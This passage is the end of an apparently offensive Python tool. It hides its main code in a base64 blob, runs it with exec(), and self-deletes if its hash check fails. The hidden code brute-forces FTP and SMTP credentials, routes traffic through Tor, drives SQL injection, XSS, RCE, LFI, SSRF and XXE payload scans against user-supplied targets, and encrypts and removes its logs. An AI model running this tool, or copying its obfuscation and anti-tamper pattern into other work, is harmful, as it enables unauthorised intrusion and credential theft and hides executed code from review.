YWQsIGV4cGxvaXRfcmVzdWx0KQogICAgICAgIGV4Y2VwdCBlcnJvcl9wZXJtIGFzIGU6CiAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1Ob3QgVnVsbmVyYWJsZToge2V9e1N0eWxlLlJFU0VUX0FMTH0iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuUkVEfUVycm9yOiB7ZX0iKQogICAgICAgIHJlc3VsdHMuYXBwZW5kKHJlc3VsdCkKICAgICAgICBzYXZlX3RvX2xvZygiRlRQIiwgZiJ7aG9zdH06e3BvcnR9IiwgcGF5bG9hZCwgcmVzdWx0WzFdLCBOb25lKQogICAgICAgIGdlbmVyYXRlX2h0bWxfcmVwb3J0KCJGVFAiLCBmIntob3N0fTp7cG9ydH0iLCBwYXlsb2FkLCByZXN1bHRbMV0pCiAgICBwcmludF9yZXN1bHRzKHJlc3VsdHMpCgpkZWYgc210cF9zY2FuKGhvc3QsIHBvcnQsIHBheWxvYWRzKToKICAgIHJlc3VsdHMgPSBbXQogICAgZm9yIHBheWxvYWQgaW4gcGF5bG9hZHM6CiAgICAgICAgdXNlcm5hbWUsIHBhc3N3b3JkID0gcGF5bG9hZC5zcGxpdCgiOiIpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBzZXJ2ZXIgPSBzbXRwbGliLlNNVFAoaG9zdCwgaW50KHBvcnQpLCB0aW1lb3V0PVJFUVVFU1RfVElNRU9VVCkKICAgICAgICAgICAgc2VydmVyLmxvZ2luKHVzZXJuYW1lLCBwYXNzd29yZCkKICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuR1JFRU59VnVsbmVyYWJsZXtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICAgICAgc2VydmVyLnF1aXQoKQogICAgICAgICAgICBleHBsb2l0X3Jlc3VsdCA9IGYiU01UUCBsb2dpbiBzdWNjZXNzZnVsIHdpdGgge3VzZXJuYW1lfTp7cGFzc3dvcmR9IgogICAgICAgICAgICBzYXZlX2N2ZV9sb2coIlNNVFAiLCBmIntob3N0fTp7cG9ydH0iLCBwYXlsb2FkLCBleHBsb2l0X3Jlc3VsdCkKICAgICAgICBleGNlcHQgc210cGxpYi5TTVRQQXV0aGVudGljYXRpb25FcnJvcjoKICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuUkVEfU5vdCBWdWxuZXJhYmxle1N0eWxlLlJFU0VUX0FMTH0iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuUkVEfUVycm9yOiB7ZX0iKQogICAgICAgIHJlc3VsdHMuYXBwZW5kKHJlc3VsdCkKICAgICAgICBzYXZlX3RvX2xvZygiU01UUCIsIGYie2hvc3R9Ontwb3J0fSIsIHBheWxvYWQsIHJlc3VsdFsxXSwgTm9uZSkKICAgICAgICBnZW5lcmF0ZV9odG1sX3JlcG9ydCgiU01UUCIsIGYie2hvc3R9Ontwb3J0fSIsIHBheWxvYWQsIHJlc3VsdFsxXSkKICAgIHByaW50X3Jlc3VsdHMocmVzdWx0cykKCmRlZiBkbnNfc2Nhbihkb21haW4sIHBheWxvYWRzKToKICAgIHJlc3VsdHMgPSBbXQogICAgZm9yIHBheWxvYWQgaW4gcGF5bG9hZHM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXNvbHZlciA9IGRucy5yZXNvbHZlci5SZXNvbHZlcigpCiAgICAgICAgICAgIGFuc3dlcnMgPSByZXNvbHZlci5yZXNvbHZlKGRvbWFpbiwgcGF5bG9hZCkKICAgICAgICAgICAgcmVzdWx0ID0gKHBheWxvYWQsIGYie0ZvcmUuR1JFRU59VnVsbmVyYWJsZSAoUmVjb3JkcyBGb3VuZCl7U3R5bGUuUkVTRVRfQUxMfSIpCiAgICAgICAgICAgIGV4cGxvaXRfcmVzdWx0ID0gIlxuIi5qb2luKFtzdHIocikgZm9yIHIgaW4gYW5zd2Vyc10pCiAgICAgICAgICAgIHNhdmVfY3ZlX2xvZygiRE5TIiwgZG9tYWluLCBwYXlsb2FkLCBleHBsb2l0X3Jlc3VsdCkKICAgICAgICBleGNlcHQgZG5zLnJlc29sdmVyLk5vQW5zd2VyOgogICAgICAgICAgICByZXN1bHQgPSAocGF5bG9hZCwgZiJ7Rm9yZS5SRUR9Tm8gUmVjb3JkcyBGb3VuZHtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHJlc3VsdCA9IChwYXlsb2FkLCBmIntGb3JlLlJFRH1FcnJvcjoge2V9IikKICAgICAgICByZXN1bHRzLmFwcGVuZChyZXN1bHQpCiAgICAgICAgc2F2ZV90b19sb2coIkROUyIsIGRvbWFpbiwgcGF5bG9hZCwgcmVzdWx0WzFdLCBOb25lKQogICAgICAgIGdlbmVyYXRlX2h0bWxfcmVwb3J0KCJETlMiLCBkb21haW4sIHBheWxvYWQsIHJlc3VsdFsxXSkKICAgIHByaW50X3Jlc3VsdHMocmVzdWx0cykKCmRlZiBhdXRvX2NsZWFudXAoKToKICAgIGZvciBmaWxlIGluIExPR19GSUxFUzoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhmaWxlKToKICAgICAgICAgICAgZW5jcnlwdF9maWxlKGZpbGUsIEVOQ1JZUFRJT05fS0VZKQogICAgICAgICAgICBvcy5yZW1vdmUoZmlsZSkKCiMgLS0tIE1haW4gRnVuY3Rpb24gLS0tCmRlZiBtYWluKCk6CiAgICBzaG93X2Jhbm5lcigpCiAgICBpZiBub3Qgc2V0X3Rvcl9wcm94eSgpOgogICAgICAgIHByb2NlZWQgPSBpbnB1dChGb3JlLllFTExPVyArICJUb3IgY29ubmVjdGlvbiBmYWlsZWQuIENvbnRpbnVlIHdpdGhvdXQgVG9yPyAoeS9uKTogIiArIFN0eWxlLlJFU0VUX0FMTCkKICAgICAgICBpZiBwcm9jZWVkLmxvd2VyKCkgIT0gJ3knOgogICAgICAgICAgICB0eXBld3JpdGVyX2VmZmVjdCgiRXhpdGluZyB0aGUgcHJvZ3JhbS4gR29vZGJ5ZSEiLCBjb2xvcj1Gb3JlLllFTExPVywgZGVsYXk9MC4xKQogICAgICAgICAgICByZXR1cm4KICAgIAogICAgd2hpbGUgVHJ1ZToKICAgICAgICBwcmludCgiXG4iICsgRm9yZS5CTFVFICsgIj09PSA0bjBuLUJ1Z0h1bnRpbmdWMS4zIChGdWxsIFN1aXRlKSA9PT0iICsgU3R5bGUuUkVTRVRfQUxMKQogICAgICAgIHByaW50KCJbMV0gU1FMIEluamVjdGlvbiIpCiAgICAgICAgcHJpbnQoIlsyXSBTU0giKQogICAgICAgIHByaW50KCJbM10gWFNTIikKICAgICAgICBwcmludCgiWzRdIENTUkYiKQogICAgICAgIHByaW50KCJbNV0gUkNFIikKICAgICAgICBwcmludCgiWzZdIExGSSIpCiAgICAgICAgcHJpbnQoIls3XSBEaXJlY3RvcnkgVHJhdmVyc2FsIikKICAgICAgICBwcmludCgiWzhdIFNlc3Npb24gSGlqYWNraW5nIikKICAgICAgICBwcmludCgiWzldIEluc2VjdXJlIERhdGEgU3RvcmFnZSIpCiAgICAgICAgcHJpbnQoIlsxMF0gWFhFIikKICAgICAgICBwcmludCgiWzExXSBTU1JGIikKICAgICAgICBwcmludCgiWzEyXSBYU1NJIikKICAgICAgICBwcmludCgiWzEzXSBGVFAiKQogICAgICAgIHByaW50KCJbMTRdIFNNVFAiKQogICAgICAgIHByaW50KCJbMTVdIEROUyIpCiAgICAgICAgcHJpbnQoIlsxNl0gRXhpdCIpCiAgICAgICAgCiAgICAgICAgY2hvaWNlID0gaW5wdXQoRm9yZS5DWUFOICsgIkVudGVyIG9wdGlvbiBudW1iZXI6ICIgKyBTdHlsZS5SRVNFVF9BTEwpCiAgICAgICAgCiAgICAgICAgaWYgY2hvaWNlID09ICcxNic6CiAgICAgICAgICAgIHR5cGV3cml0ZXJfZWZmZWN0KCJFeGl0aW5nIHRoZSBwcm9ncmFtLiBHb29kYnllISIsIGNvbG9yPUZvcmUuWUVMTE9XLCBkZWxheT0wLjEpCiAgICAgICAgICAgIGF1dG9fY2xlYW51cCgpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIAogICAgICAgIGlmIGNob2ljZSBub3QgaW4gW3N0cihpKSBmb3IgaSBpbiByYW5nZSgxLCAxNildOgogICAgICAgICAgICBwcmludCgiSW52YWxpZCBvcHRpb24uIFBsZWFzZSB0cnkgYWdhaW4uIikKICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgaWYgY2hvaWNlIGluIFsnMicsICcxMycsICcxNCddOiAgIyBDcmVkZW50aWFsLWJhc2VkIHNjYW5zCiAgICAgICAgICAgIGhvc3QgPSBpbnB1dCgiRW50ZXIgaG9zdDogIikKICAgICAgICAgICAgcG9ydCA9IGlucHV0KCJFbnRlciBwb3J0OiAiKQogICAgICAgICAgICBpZiBub3QgcG9ydC5pc2RpZ2l0KCk6CiAgICAgICAgICAgICAgICBwcmludCgiUG9ydCBtdXN0IGJlIGEgbnVtYmVyLiIpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBmaWxlX3BhdGggPSBpbnB1dCgiRW50ZXIgcGF5bG9hZCBmaWxlIHBhdGggKGNyZWRlbnRpYWxzKTogIikKICAgICAgICAgICAgcGF5bG9hZHMgPSByZWFkX3BheWxvYWRzX2Zyb21fZmlsZShmaWxlX3BhdGgpCiAgICAgICAgICAgIGlmIG5vdCBwYXlsb2FkczoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIGlmIGNob2ljZSA9PSAnMic6CiAgICAgICAgICAgICAgICBzc2hfc2Nhbihob3N0LCBwb3J0LCBwYXlsb2FkcykKICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gJzEzJzoKICAgICAgICAgICAgICAgIGZ0cF9zY2FuKGhvc3QsIHBvcnQsIHBheWxvYWRzKQogICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAnMTQnOgogICAgICAgICAgICAgICAgc210cF9zY2FuKGhvc3QsIHBvcnQsIHBheWxvYWRzKQogICAgICAgIGVsaWYgY2hvaWNlID09ICcxNSc6CiAgICAgICAgICAgIGRvbWFpbiA9IGlucHV0KCJFbnRlciBkb21haW46ICIpCiAgICAgICAgICAgIGZpbGVfcGF0aCA9IGlucHV0KCJFbnRlciBwYXlsb2FkIGZpbGUgcGF0aCAoRE5TIHF1ZXJ5IHR5cGVzKTogIikKICAgICAgICAgICAgcGF5bG9hZHMgPSByZWFkX3BheWxvYWRzX2Zyb21fZmlsZShmaWxlX3BhdGgpCiAgICAgICAgICAgIGlmIG5vdCBwYXlsb2FkczoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIGRuc19zY2FuKGRvbWFpbiwgcGF5bG9hZHMpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgdXJsID0gaW5wdXQoIkVudGVyIHRhcmdldCBVUkw6ICIpCiAgICAgICAgICAgIGlmIG5vdCB2YWxpZGF0ZV91cmwodXJsKToKICAgICAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIFVSTC4gTWFrZSBzdXJlIHRoZSBVUkwgc3RhcnRzIHdpdGggaHR0cDovLyBvciBodHRwczovLyIpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBmaWxlX3BhdGggPSBpbnB1dCgiRW50ZXIgcGF5bG9hZCBmaWxlIHBhdGg6ICIpCiAgICAgICAgICAgIHBheWxvYWRzID0gcmVhZF9wYXlsb2Fkc19mcm9tX2ZpbGUoZmlsZV9wYXRoKQogICAgICAgICAgICBpZiBub3QgcGF5bG9hZHM6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBpZiBjaG9pY2UgPT0gJzEnOgogICAgICAgICAgICAgICAgc3FsX2luamVjdGlvbih1cmwsIHBheWxvYWRzKQogICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAnMyc6CiAgICAgICAgICAgICAgICB4c3Nfc2Nhbih1cmwsIHBheWxvYWRzKQogICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAnNCc6CiAgICAgICAgICAgICAgICBjc3JmX3NjYW4odXJsLCBwYXlsb2FkcykKICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gJzUnOgogICAgICAgICAgICAgICAgcmNlX3NjYW4odXJsLCBwYXlsb2FkcykKICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gJzYnOgogICAgICAgICAgICAgICAgbGZpX3NjYW4odXJsLCBwYXlsb2FkcykKICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gJzcnOgogICAgICAgICAgICAgICAgZGlyZWN0b3J5X3RyYXZlcnNhbF9zY2FuKHVybCwgcGF5bG9hZHMpCiAgICAgICAgICAgIGVsaWYgY2hvaWNlID09ICc4JzoKICAgICAgICAgICAgICAgIHNlc3Npb25faGlqYWNraW5nX3NjYW4odXJsLCBwYXlsb2FkcykKICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gJzknOgogICAgICAgICAgICAgICAgaW5zZWN1cmVfZGF0YV9zdG9yYWdlX3NjYW4odXJsLCBwYXlsb2FkcykKICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gJzEwJzoKICAgICAgICAgICAgICAgIHh4ZV9zY2FuKHVybCwgcGF5bG9hZHMpCiAgICAgICAgICAgIGVsaWYgY2hvaWNlID09ICcxMSc6CiAgICAgICAgICAgICAgICBzc3JmX3NjYW4odXJsLCBwYXlsb2FkcykKICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gJzEyJzoKICAgICAgICAgICAgICAgIHhzc2lfc2Nhbih1cmwsIHBheWxvYWRzKQoKICAgICAgICBpbnB1dChGb3JlLk1BR0VOVEEgKyAiXG5QcmVzcyBFbnRlciB0byByZXR1cm4gdG8gdGhlIG1haW4gbWVudS4uLiIgKyBTdHlsZS5SRVNFVF9BTEwpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigpCg=="
decoded = base64.b64decode(code).decode()

# Compute current script hash
current_hash = hashlib.sha256(decoded.encode()).hexdigest()

# Expected hash (original hash)
expected_hash = "fe40a60a8c48d0380cfb4bdb9caedf8e1848b9298e9ef35cd0123086cbb9a49a"

# Check for tampering
if current_hash != expected_hash:
    print("Warning: Script has been modified! Deleting...")
    os.remove(__file__)  # Self-delete
    exit()

exec(decoded)
